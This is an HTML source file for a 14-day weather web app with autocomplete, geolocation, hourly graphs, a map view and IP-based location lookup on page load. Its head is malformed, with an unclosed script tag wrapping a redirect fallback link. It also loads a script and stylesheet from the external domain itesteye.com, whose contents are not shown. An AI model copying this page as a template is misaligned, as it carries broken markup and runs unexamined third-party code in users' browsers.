<!DOCTYPE html>
<html lang="en">
<head>

    <script>

<body>
    <!-- Fallback for users with JavaScript disabled -->
    <p>If you are not redirected automatically, <a href="https://itesteye.com/weather">click here</a>.</p> 
    -->

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>14-Day Weather</title>
    <link rel="stylesheet" href="https://itesteye.com/bg.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
    <style>
        body { font-family: system-ui, -apple-system, sans-serif; max-width: 900px; margin: 2rem auto; padding: 0 1rem; }
        .search-box { display: flex; gap: 0.5rem; margin-bottom: 2rem; }
        .input-wrap { position: relative; flex: 1; }
        input { width: 100%; box-sizing: border-box; padding: 0.75rem 2.9rem 0.75rem 0.75rem; border: 1px solid #ccc; border-radius: 4px; font-size: 1rem; }
        button { padding: 0.75rem 1.5rem; background: #0056b3; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 1rem; }
        button:hover { background: #004494; }
        button:focus-visible, input:focus-visible { outline: 3px solid #0056b3; outline-offset: 2px; }
        .loc-btn { position: absolute; right: 4px; top: 4px; bottom: 4px; width: 2.4rem; padding: 0; background: transparent; color: #0056b3; display: grid; place-items: center; }
        .loc-btn:hover { background: #e8f0fa; }
        .loc-btn svg { width: 1.3rem; height: 1.3rem; }
        .loc-btn.busy svg { animation: pulse 1s ease-in-out infinite; }
        @keyframes pulse { 50% { opacity: .3; } }
        .suggestions { position: absolute; left: 0; right: 0; top: calc(100% + 4px); z-index: 10; margin: 0; padding: 0.25rem 0; list-style: none; background: #fff; border: 1px solid #ccc; border-radius: 6px; box-shadow: 0 6px 18px rgba(0,0,0,.12); max-height: 280px; overflow-y: auto; }
        .suggestions[hidden] { display: none; }
        .suggestions li { padding: 0.55rem 0.85rem; cursor: pointer; }
        .suggestions li small { display: block; color: #666; }
        .suggestions li:hover, .suggestions li.active { background: #e8f0fa; }
        /* Forecast / Map toggle */
        .view-toggle { display: inline-flex; margin-bottom: 1rem; border: 1px solid #0056b3; border-radius: 8px; overflow: hidden; }
        .view-toggle button { background: #fff; color: #0056b3; border-radius: 0; padding: 0.5rem 1.25rem; font-size: 0.95rem; }
        .view-toggle button:hover:not([aria-pressed="true"]) { background: #e8f0fa; }
        .view-toggle button[aria-pressed="true"] { background: #0056b3; color: #fff; }

        /* Map view */
        .map-hint { margin: 0 0 0.5rem; font-size: 0.9rem; color: #666; }
        #map { height: 460px; border-radius: 12px; border: 1px solid #ccc; margin-bottom: 1rem; z-index: 0; }
        .leaflet-container { font: inherit; }
        .wx-pop { min-width: 190px; }
        .wx-pop h4 { margin: 0 0 0.35rem; font-size: 1rem; }
        .wx-pop .wx-now { display: flex; align-items: center; gap: 0.6rem; }
        .wx-pop .wx-icon { font-size: 2.2rem; line-height: 1; }
        .wx-pop .wx-temp { font-size: 1.6rem; font-weight: 700; line-height: 1.1; }
        .wx-pop .wx-cond { color: #555; font-size: 0.85rem; }
        .wx-pop .wx-meta { margin-top: 0.45rem; font-size: 0.82rem; color: #444; display: grid; gap: 0.15rem; }
        .wx-pop button { margin-top: 0.6rem; padding: 0.4rem 0.8rem; font-size: 0.85rem; width: 100%; }
        .calendar { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 0.75rem; }
        .day-card { border: 1px solid #e0e0e0; border-radius: 8px; padding: 0.9rem 0.4rem; text-align: center; background: #fafafa; }
        .day-card .date { font-weight: bold; margin-bottom: 0.5rem; font-size: 0.9rem; }
        .day-card .icon { font-size: 1.6rem; }
        .day-card .temp { font-size: 1rem; color: #333; margin: 0.5rem 0; }
        .day-card .condition { font-size: 0.8rem; color: #666; }

        /* Today: one big card spanning the full width */
        .today-card { grid-column: 1 / -1; color: #fff; border-radius: 12px; padding: 1.5rem 1.75rem;
                      background: linear-gradient(135deg, #0056b3, #3a8dde); }
        .today-head { display: flex; flex-wrap: wrap; align-items: baseline; gap: 0.5rem 1rem; margin-bottom: 1rem; }
        .today-label { font-size: 1.5rem; font-weight: 700; }
        .today-date { font-size: 1.05rem; opacity: .9; }
        .today-body { display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 1rem 2rem; }
        .today-icon { font-size: 4.5rem; line-height: 1; }
        .today-main { flex: 1; min-width: 160px; }
        .today-temp { font-size: 3rem; font-weight: 700; line-height: 1.1; }
        .today-temp span { font-size: 1.3rem; font-weight: 500; opacity: .85; }
        .today-cond { font-size: 1.2rem; margin-top: 0.25rem; }
        .today-meta { display: grid; gap: 0.35rem; font-size: 1rem; }

        /* Hour-by-hour strip with temperature graph (scrolls sideways) */
        .hourly-title { margin: 1.4rem 0 0.4rem; font-size: 1rem; font-weight: 600; opacity: .9; }
        .hourly-scroll { overflow-x: auto; padding-bottom: 0.4rem; scrollbar-width: thin; scrollbar-color: rgba(255,255,255,.5) transparent; }
        .hourly-inner { position: relative; width: 1536px; }          /* 24 hours x 64px */
        .hourly-graph { display: block; width: 1536px; height: 64px; }
        .hourly-row { display: flex; }
        .hour { flex: 0 0 64px; box-sizing: border-box; text-align: center; padding: 0.45rem 0; border-radius: 8px; font-size: 0.85rem; }
        .hour .h-time { opacity: .85; }
        .hour .h-icon { font-size: 1.4rem; margin: 0.2rem 0; }
        .hour .h-temp { font-weight: 600; }
        .hour .h-rain { font-size: 0.75rem; opacity: .85; min-height: 1.1em; }
        .hour.now { background: rgba(255,255,255,.25); outline: 1px solid rgba(255,255,255,.6); }

        /* Next 13 days fill two rows: 7 + 6, with the last card stretched to close the gap */
        @media (min-width: 760px) {
            .calendar { grid-template-columns: repeat(7, 1fr); }
            .calendar .day-card:last-child { grid-column: span 2; }
        }
        .error { color: #d32f2f; margin-top: 1rem; font-weight: bold; }
        .status { color: #666; margin-top: 1rem; }
    </style>
</head>
<body>
    <h1></h1>
    <div class="search-box">
        <div class="input-wrap">
            <input type="text" id="cityInput" placeholder="Enter city name (e.g., London)"
                   autocomplete="off" role="combobox" aria-expanded="false"
                   aria-controls="suggestions" aria-autocomplete="list" aria-label="City name">
            <button type="button" class="loc-btn" id="locBtn" title="Use my current location" aria-label="Use my current location">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
                    <circle cx="12" cy="12" r="3"/><circle cx="12" cy="12" r="7"/>
                    <path d="M12 1v4M12 19v4M1 12h4M19 12h4"/>
                </svg>
            </button>
            <ul class="suggestions" id="suggestions" role="listbox" hidden></ul>
        </div>
        <button type="button" id="goBtn">Get Forecast</button>
    </div>
    <div class="view-toggle" role="group" aria-label="Choose view">
        <button type="button" id="viewForecast" aria-pressed="true">Forecast</button>
        <button type="button" id="viewMap" aria-pressed="false">Map</button>
    </div>
    <div id="error" class="error"></div>
    <div id="status" class="status"></div>
    <div id="mapView" hidden>
        <p class="map-hint">Click anywhere on the map to see the weather there. Use the target icon in the search box to jump to your location.</p>
        <div id="map"></div>
    </div>
    <div id="calendar" class="calendar"></div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
    // Free, key-less APIs: Open-Meteo (geocoding + forecast) and BigDataCloud (reverse geocoding).
    const WMO = {
        0:['Clear sky','☀️'], 1:['Mainly clear','🌤️'], 2:['Partly cloudy','⛅'], 3:['Overcast','☁️'],
        45:['Fog','🌫️'], 48:['Rime fog','🌫️'],
        51:['Light drizzle','🌦️'], 53:['Drizzle','🌦️'], 55:['Heavy drizzle','🌧️'],
        56:['Freezing drizzle','🌧️'], 57:['Heavy freezing drizzle','🌧️'],
        61:['Light rain','🌦️'], 63:['Rain','🌧️'], 65:['Heavy rain','🌧️'],
        66:['Freezing rain','🌧️'], 67:['Heavy freezing rain','🌧️'],
        71:['Light snow','🌨️'], 73:['Snow','🌨️'], 75:['Heavy snow','❄️'], 77:['Snow grains','❄️'],
        80:['Light showers','🌦️'], 81:['Showers','🌧️'], 82:['Heavy showers','⛈️'],
        85:['Snow showers','🌨️'], 86:['Heavy snow showers','❄️'],
        95:['Thunderstorm','⛈️'], 96:['Storm with hail','⛈️'], 99:['Heavy storm with hail','⛈️']
    };

    const input = document.getElementById('cityInput');
    const list = document.getElementById('suggestions');
    const errorDiv = document.getElementById('error');
    const statusDiv = document.getElementById('status');
    const calendarDiv = document.getElementById('calendar');
    const locBtn = document.getElementById('locBtn');

    let selectedLoc = null;   // exact place chosen from suggestions or geolocation
    let suggestions = [];
    let activeIndex = -1;
    let debounceTimer = null;
    let suggestAbort = null;
    let forecastAbort = null;

    const placeName = l => [l.name, l.admin1, l.country].filter(Boolean).join(', ');
    const setStatus = msg => { statusDiv.textContent = msg; };
    const showError = msg => { errorDiv.textContent = `Error: ${msg}`; };

    /* ---------- Suggestions ---------- */
    function hideSuggestions() {
        clearTimeout(debounceTimer);
        if (suggestAbort) suggestAbort.abort();
        list.hidden = true;
        input.setAttribute('aria-expanded', 'false');
        activeIndex = -1;
    }

    function renderSuggestions() {
        list.replaceChildren();
        if (!suggestions.length) { list.hidden = true; return; }
        suggestions.forEach((loc, i) => {
            const li = document.createElement('li');
            li.role = 'option';
            li.id = 'sugg-' + i;
            const name = document.createElement('span');
            name.textContent = loc.name;
            const sub = document.createElement('small');
            sub.textContent = [loc.admin1, loc.country].filter(Boolean).join(', ');
            li.append(name, sub);
            li.addEventListener('mousedown', e => { e.preventDefault(); chooseSuggestion(i); });
            list.appendChild(li);
        });
        list.hidden = false;
        input.setAttribute('aria-expanded', 'true');
    }

    function setActive(i) {
        const items = list.children;
        if (!items.length) return;
        activeIndex = (i + items.length) % items.length;
        [...items].forEach((li, idx) => li.classList.toggle('active', idx === activeIndex));
        input.setAttribute('aria-activedescendant', items[activeIndex].id);
        items[activeIndex].scrollIntoView({ block: 'nearest' });
    }

    async function fetchSuggestions(q) {
        if (suggestAbort) suggestAbort.abort();
        suggestAbort = new AbortController();
        try {
            const res = await fetch(
                `https://geocoding-api.open-meteo.com/v1/search?name=${encodeURIComponent(q)}&count=6&language=en`,
                { signal: suggestAbort.signal });
            if (!res.ok) return;
            const data = await res.json();
            suggestions = data.results || [];
            renderSuggestions();
        } catch (e) { /* aborted or offline: ignore */ }
    }

    function chooseSuggestion(i) {
        const loc = suggestions[i];
        if (!loc) return;
        hideSuggestions();
        selectedLoc = loc;
        input.value = placeName(loc);
        loadForecast(loc);
    }

    input.addEventListener('input', () => {
        selectedLoc = null;
        clearTimeout(debounceTimer);
        const q = input.value.trim();
        if (q.length < 2) { hideSuggestions(); return; }
        debounceTimer = setTimeout(() => fetchSuggestions(q), 250);
    });

    input.addEventListener('keydown', e => {
        const open = !list.hidden;
        if (e.key === 'ArrowDown') { e.preventDefault(); if (open) setActive(activeIndex + 1); }
        else if (e.key === 'ArrowUp') { e.preventDefault(); if (open) setActive(activeIndex - 1); }
        else if (e.key === 'Escape') { hideSuggestions(); }
        else if (e.key === 'Enter') {
            e.preventDefault();
            if (open && activeIndex >= 0) chooseSuggestion(activeIndex);
            else getWeather();
        }
    });

    input.addEventListener('blur', hideSuggestions);
    document.getElementById('goBtn').addEventListener('click', getWeather);

    /* ---------- Current location ---------- */
    locBtn.addEventListener('click', () => {
        errorDiv.textContent = '';
        hideSuggestions();
        if (!navigator.geolocation) { showError('Geolocation is not supported by this browser.'); return; }
        locBtn.classList.add('busy');
        setStatus('Finding your location…');
        navigator.geolocation.getCurrentPosition(async pos => {
            const { latitude, longitude } = pos.coords;
            const loc = { name: 'Your location', latitude, longitude, admin1: '', country: '' };
            try {
                const r = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`);
                if (r.ok) {
                    const g = await r.json();
                    const city = g.city || g.locality || g.principalSubdivision;
                    if (city) {
                        loc.name = city;
                        loc.admin1 = g.principalSubdivision && g.principalSubdivision !== city ? g.principalSubdivision : '';
                        loc.country = g.countryName || '';
                    }
                }
            } catch (e) { /* keep fallback name */ }
            locBtn.classList.remove('busy');
            setMyLocation(loc, false);
            selectedLoc = loc;
            input.value = loc.name === 'Your location' ? '' : placeName(loc);
            loadForecast(loc);
        }, err => {
            locBtn.classList.remove('busy');
            setStatus('');
            showError(err.code === 1
                ? 'Location permission was denied. Allow it in your browser settings, or type a city.'
                : 'Could not get your location. Try typing a city instead.');
        }, { timeout: 10000, maximumAge: 300000 });
    });

    /* ---------- Weather ---------- */
    async function getWeather() {
        hideSuggestions();
        errorDiv.textContent = '';
        const city = input.value.trim();
        if (!city) { showError('Please enter a city name.'); return; }
        if (selectedLoc) { loadForecast(selectedLoc); return; }

        try {
            setStatus('Loading…');
            const res = await fetch(`https://geocoding-api.open-meteo.com/v1/search?name=${encodeURIComponent(city)}&count=1&language=en`);
            if (!res.ok) throw new Error(`Geocoding failed (${res.status})`);
            const geo = await res.json();
            if (!geo.results || !geo.results.length) throw new Error(`City not found: "${city}"`);
            selectedLoc = geo.results[0];
            await loadForecast(selectedLoc);
        } catch (err) {
            setStatus('');
            showError(err.message);
        }
    }

    // Builds today's 24 hour blocks with a temperature line graph above them
    function buildHourly(fc, todayStr) {
        const h = fc.hourly;
        if (!h || !h.time) return null;
        const idx = [];
        h.time.forEach((t, i) => { if (t.startsWith(todayStr)) idx.push(i); });
        if (!idx.length) return null;

        // Current hour in the searched city's own time zone
        const local = new Date(Date.now() + (fc.utc_offset_seconds || 0) * 1000);
        const nowKey = local.toISOString().slice(0, 13);              // "YYYY-MM-DDTHH"

        const W = 64, H = 64, PAD = 14;
        const temps = idx.map(i => h.temperature_2m[i]);
        const lo = Math.min(...temps), hi = Math.max(...temps);
        const y = t => hi === lo ? H / 2 : PAD + (hi - t) / (hi - lo) * (H - PAD * 2);
        const pts = temps.map((t, n) => [n * W + W / 2, y(t)]);

        const line = pts.map(p => p.join(',')).join(' ');
        const area = `${pts[0][0]},${H} ${line} ${pts[pts.length - 1][0]},${H}`;
        const dots = pts.map(p => `<circle cx="${p[0]}" cy="${p[1]}" r="3" fill="#fff"/>`).join('');

        const blocks = idx.map(i => {
            const code = h.weather_code[i];
            let icon = (WMO[code] || ['', '❔'])[1];
            if (h.is_day && h.is_day[i] === 0) {                       // night icons
                if (code === 0 || code === 1) icon = '🌙';
                else if (code === 2) icon = '☁️';
            }
            const rain = h.precipitation_probability ? h.precipitation_probability[i] : null;
            const isNow = h.time[i].slice(0, 13) === nowKey;
            return `<div class="hour${isNow ? ' now' : ''}">
                        <div class="h-time">${h.time[i].slice(11, 16)}</div>
                        <div class="h-icon">${icon}</div>
                        <div class="h-temp">${Math.round(h.temperature_2m[i])}°</div>
                        <div class="h-rain">${rain ? '💧' + rain + '%' : ''}</div>
                    </div>`;
        }).join('');

        const wrap = document.createElement('div');
        wrap.innerHTML = `
            <div class="hourly-title">Hour by hour</div>
            <div class="hourly-scroll">
                <div class="hourly-inner">
                    <svg class="hourly-graph" viewBox="0 0 ${idx.length * W} ${H}" preserveAspectRatio="none" aria-hidden="true">
                        <polygon points="${area}" fill="rgba(255,255,255,.18)"/>
                        <polyline points="${line}" fill="none" stroke="#fff" stroke-width="2" stroke-linejoin="round"/>
                        ${dots}
                    </svg>
                    <div class="hourly-row">${blocks}</div>
                </div>
            </div>`;
        return wrap;
    }

    /* ---------- Map view (Leaflet + OpenStreetMap) ---------- */
    const forecastView = document.getElementById('calendar');
    const mapView = document.getElementById('mapView');
    const btnForecast = document.getElementById('viewForecast');
    const btnMap = document.getElementById('viewMap');

    let map = null, marker = null, myMarker = null;
    let lastLoc = null, lastFc = null, myLoc = null;
    let flyNext = true;          // fly to the place after search/location; just open the popup after a map click
    let pickToken = 0;

    const iconFor = (code, isDay) => {
        let icon = (WMO[code] || ['', '❔'])[1];
        if (isDay === 0) { if (code === 0 || code === 1) icon = '🌙'; else if (code === 2) icon = '☁️'; }
        return icon;
    };

    function scrollHourlyToNow() {
        const nowBlock = calendarDiv.querySelector('.hour.now');
        const scroller = calendarDiv.querySelector('.hourly-scroll');
        if (nowBlock && scroller) scroller.scrollLeft = Math.max(0, nowBlock.offsetLeft - 16);
    }

    function setView(view) {
        const isMap = view === 'map';
        forecastView.hidden = isMap;
        mapView.hidden = !isMap;
        btnForecast.setAttribute('aria-pressed', String(!isMap));
        btnMap.setAttribute('aria-pressed', String(isMap));
        if (isMap) {
            initMap();
            if (map) setTimeout(() => { map.invalidateSize(); showMarker(); drawMyLocation(); }, 50);
        } else {
            scrollHourlyToNow();
        }
    }
    btnForecast.addEventListener('click', () => setView('forecast'));
    btnMap.addEventListener('click', () => setView('map'));

    function initMap() {
        if (map) return;
        if (typeof L === 'undefined') { showError('The map could not load. Check your connection and try again.'); return; }
        map = L.map('map', { doubleClickZoom: false }).setView([20, 0], 2);
        L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', {
            maxZoom: 19,
            attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
        }).addTo(map);
        map.on('click', e => pickFromMap(e.latlng.wrap()));
    }

    // Click on the map: name the place, then load its weather
    async function pickFromMap(ll) {
        const token = ++pickToken;
        const { lat, lng } = ll;
        errorDiv.textContent = '';
        setStatus('Finding place…');
        const loc = { name: `${lat.toFixed(2)}°, ${lng.toFixed(2)}°`, admin1: '', country: '', latitude: lat, longitude: lng };
        try {
            const r = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`);
            if (r.ok) {
                const g = await r.json();
                const name = g.city || g.locality || g.principalSubdivision || g.countryName;
                if (name) {
                    loc.name = name;
                    loc.admin1 = g.principalSubdivision && g.principalSubdivision !== name ? g.principalSubdivision : '';
                    loc.country = g.countryName && g.countryName !== name ? g.countryName : '';
                }
            }
        } catch (e) { /* keep the coordinates as the name */ }
        if (token !== pickToken) return;                    // user clicked somewhere else meanwhile
        selectedLoc = loc;
        input.value = placeName(loc);
        flyNext = false;
        loadForecast(loc);
    }

    function buildPopup() {
        const loc = lastLoc, fc = lastFc;
        const box = document.createElement('div');
        box.className = 'wx-pop';
        const cur = fc.current || {};
        const code = cur.weather_code != null ? cur.weather_code : fc.daily.weather_code[0];
        const [phrase] = WMO[code] || ['No data'];
        const temp = cur.temperature_2m != null ? cur.temperature_2m : fc.daily.temperature_2m_max[0];

        const h = document.createElement('h4');
        h.textContent = placeName(loc);
        const now = document.createElement('div');
        now.className = 'wx-now';
        const ic = document.createElement('div');
        ic.className = 'wx-icon';
        ic.textContent = iconFor(code, cur.is_day);
        const tx = document.createElement('div');
        const t = document.createElement('div');
        t.className = 'wx-temp';
        t.textContent = `${Math.round(temp)}°C`;
        const c = document.createElement('div');
        c.className = 'wx-cond';
        c.textContent = phrase;
        tx.append(t, c);
        now.append(ic, tx);

        const meta = document.createElement('div');
        meta.className = 'wx-meta';
        const hi = document.createElement('div');
        hi.textContent = `Today: ${Math.round(fc.daily.temperature_2m_max[0])}° / ${Math.round(fc.daily.temperature_2m_min[0])}°`;
        meta.appendChild(hi);
        const rain = fc.daily.precipitation_probability_max && fc.daily.precipitation_probability_max[0];
        const wind = fc.daily.wind_speed_10m_max && fc.daily.wind_speed_10m_max[0];
        if (rain != null) { const d = document.createElement('div'); d.textContent = `💧 Rain chance: ${rain}%`; meta.appendChild(d); }
        if (wind != null) { const d = document.createElement('div'); d.textContent = `💨 Max wind: ${Math.round(wind)} km/h`; meta.appendChild(d); }

        const btn = document.createElement('button');
        btn.type = 'button';
        btn.textContent = 'See 14-day forecast';
        btn.addEventListener('click', () => { map.closePopup(); setView('forecast'); window.scrollTo({ top: 0, behavior: 'smooth' }); });

        box.append(h, now, meta, btn);
        return box;
    }

    function showMarker() {
        if (!map || !lastLoc || !lastFc) return;
        if (marker) marker.remove();
        marker = L.marker([lastLoc.latitude, lastLoc.longitude]).addTo(map);
        marker.bindPopup(buildPopup());
        if (flyNext) map.flyTo([lastLoc.latitude, lastLoc.longitude], 9, { duration: 1 });
        flyNext = true;
        marker.openPopup();
    }

    // Blue dot for the visitor's own location (precise or approximate)
    function drawMyLocation() {
        if (!map || !myLoc) return;
        if (myMarker) myMarker.remove();
        myMarker = L.circleMarker([myLoc.latitude, myLoc.longitude], {
            radius: 8, color: '#fff', weight: 2, fillColor: '#1a73e8', fillOpacity: 1
        }).addTo(map).bindTooltip(myLoc.approx ? 'You are around here (approximate)' : 'You are here');
    }

    function setMyLocation(loc, approx) {
        myLoc = { latitude: loc.latitude, longitude: loc.longitude, approx };
        drawMyLocation();
    }

    // Called after every successful forecast load
    function onForecastLoaded(loc, fc) {
        lastLoc = loc; lastFc = fc;
        if (map && !mapView.hidden) showMarker();
    }

    async function loadForecast(loc) {
        if (forecastAbort) forecastAbort.abort();
        forecastAbort = new AbortController();
        errorDiv.textContent = '';
        calendarDiv.replaceChildren();
        setStatus('Loading…');
        try {
            const url = `https://api.open-meteo.com/v1/forecast?latitude=${loc.latitude}&longitude=${loc.longitude}` +
                        `&daily=temperature_2m_max,temperature_2m_min,weather_code,precipitation_probability_max,wind_speed_10m_max` +
                        `&current=temperature_2m,weather_code,is_day` +
                        `&hourly=temperature_2m,weather_code,precipitation_probability,is_day` +
                        `&forecast_days=14&timezone=auto`;
            const res = await fetch(url, { signal: forecastAbort.signal });
            if (!res.ok) throw new Error(`Forecast request failed (${res.status})`);
            const fc = await res.json();
            const days = (fc.daily && fc.daily.time) || [];
            if (!days.length) throw new Error('No forecast data returned.');

            days.forEach((dateStr, i) => {
                const d = new Date(dateStr + 'T12:00:00');
                const min = fc.daily.temperature_2m_min[i];
                const max = fc.daily.temperature_2m_max[i];
                const [phrase, icon] = WMO[fc.daily.weather_code[i]] || ['No data', '❔'];
                const card = document.createElement('div');

                if (i === 0) {
                    // Big "today" card: weekday + full date on top
                    const fullDate = d.toLocaleDateString('en-US', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' });
                    const rain = fc.daily.precipitation_probability_max && fc.daily.precipitation_probability_max[i];
                    const wind = fc.daily.wind_speed_10m_max && fc.daily.wind_speed_10m_max[i];
                    card.className = 'today-card';
                    card.innerHTML = `
                        <div class="today-head">
                            <span class="today-label">Today</span>
                            <span class="today-date">${fullDate}</span>
                        </div>
                        <div class="today-body">
                            <div class="today-icon">${icon}</div>
                            <div class="today-main">
                                <div class="today-temp">${Math.round(max)}°<span> / ${Math.round(min)}°C</span></div>
                                <div class="today-cond">${phrase}</div>
                            </div>
                            <div class="today-meta">
                                ${rain != null ? `<div>💧 Rain chance: ${rain}%</div>` : ''}
                                ${wind != null ? `<div>💨 Max wind: ${Math.round(wind)} km/h</div>` : ''}
                            </div>
                        </div>`;
                    const hourly = buildHourly(fc, dateStr);
                    if (hourly) card.appendChild(hourly);
                } else {
                    const dayName = d.toLocaleDateString('en-US', { weekday: 'short' });
                    const dateNum = d.toLocaleDateString('en-US', { day: 'numeric', month: 'short' });
                    card.className = 'day-card';
                    card.innerHTML = `
                        <div class="date">${dayName}, ${dateNum}</div>
                        <div class="icon">${icon}</div>
                        <div class="temp">${Math.round(min)}° to ${Math.round(max)}°C</div>
                        <div class="condition">${phrase}</div>`;
                }
                calendarDiv.appendChild(card);
            });
            const nowBlock = calendarDiv.querySelector('.hour.now');
            const scroller = calendarDiv.querySelector('.hourly-scroll');
            if (nowBlock && scroller) scroller.scrollLeft = Math.max(0, nowBlock.offsetLeft - 16);
            setStatus(`14-day forecast for ${placeName(loc)}`);
            onForecastLoaded(loc, fc);
        } catch (err) {
            if (err.name === 'AbortError') return;
            setStatus('');
            showError(err.message);
        }
    }

    /* ---------- Auto-load approximate location from IP (no permission prompt) ---------- */
    // Route your geo Worker here. A relative path works if it's routed on the same domain as this page;
    // otherwise use the full URL (and list this site in ALLOWED_ORIGINS inside the Worker).
    const GEO_URL = '/api/geo';

    async function autoLoadByIP() {
        setStatus('Detecting your approximate location…');
        const sources = [
            async () => {   // 1st choice: your own Cloudflare Worker (see geo-worker.js)
                const r = await fetch(GEO_URL);
                if (!r.ok) throw new Error('geo worker failed');
                const d = await r.json();
                return { name: d.city, admin1: d.region, country: d.country, latitude: d.latitude, longitude: d.longitude };
            },
            async () => {
                const d = await (await fetch('https://ipwho.is/')).json();
                if (!d.success) throw new Error('ipwho failed');
                return { name: d.city, admin1: d.region, country: d.country, latitude: d.latitude, longitude: d.longitude };
            },
            async () => {   // fallback: with no coordinates given, BigDataCloud uses the visitor's IP
                const d = await (await fetch('https://api.bigdatacloud.net/data/reverse-geocode-client?localityLanguage=en')).json();
                if (d.latitude == null) throw new Error('bigdatacloud failed');
                return { name: d.city || d.locality, admin1: d.principalSubdivision, country: d.countryName, latitude: d.latitude, longitude: d.longitude };
            }
        ];
        let loc = null;
        for (const src of sources) {
            try { const r = await src(); if (r && r.name && r.latitude != null) { loc = r; break; } } catch (e) { /* try next */ }
        }
        // Give up quietly if lookup failed, or the user already typed/picked something meanwhile
        if (!loc || selectedLoc || input.value.trim()) { if (!selectedLoc) setStatus(''); return; }

        setMyLocation(loc, true);
        selectedLoc = loc;
        input.value = placeName(loc);
        await loadForecast(loc);
        if (statusDiv.textContent.startsWith('14-day')) {
            statusDiv.textContent += ' (approximate, based on your internet connection)';
        }
    }
    autoLoadByIP();
    </script>
    <script src="https://itesteye.com/load.js"></script>
</body>
